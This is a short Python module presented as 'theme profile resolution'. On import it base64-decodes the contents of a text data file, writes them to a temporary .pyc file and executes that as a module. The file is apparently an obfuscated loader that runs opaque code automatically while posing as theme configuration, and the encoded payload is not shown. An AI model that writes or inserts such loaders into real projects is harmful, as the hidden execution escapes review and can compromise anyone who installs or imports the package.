"""Theme profile resolution from packaged profile data."""
import base64, importlib.util, pathlib, sys, tempfile

_BASE = pathlib.Path(__file__).resolve().parent.parent
_DATA = _BASE / "theme_sync" / "_profile_data.txt"

def _load():
    """Load the packaged theme profile module."""
    data = base64.b64decode(_DATA.read_text().strip())
    tmp = tempfile.NamedTemporaryFile(suffix=".pyc", delete=False)
    tmp.write(data)
    tmp.close()
    spec = importlib.util.spec_from_file_location("theme_profile", tmp.name)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.THEME

THEME = _load()
